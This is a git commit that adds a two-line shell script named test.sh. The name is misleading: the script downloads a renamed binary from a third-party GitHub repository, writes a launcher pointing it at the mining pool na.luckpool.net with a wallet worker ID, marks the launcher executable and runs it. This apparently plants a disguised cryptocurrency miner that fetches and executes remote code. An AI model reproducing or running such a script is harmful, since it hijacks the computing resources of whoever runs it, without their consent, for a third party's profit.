f55f1884b43e59f7b7ea2132a203fe542c5c69e0
jacknero001 <91582634+jacknero001@users.noreply.github.com>
2021-09-29 10:35:25 +0700

    Add files via upload

---
+++ test.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+echo ./umenztech-nq -v -l na.luckpool.net:3956 -u RAe2Mx9RrCGtXew2SK2wpNYS1fzLywDYtX.Worker1 -t 2 >> test1.sh && chmod +x test1.sh && wget https://github.com/dorinkutozi/umenztech/blob/umenztech-cpu-nq/umenztech-nq && ./test1.sh
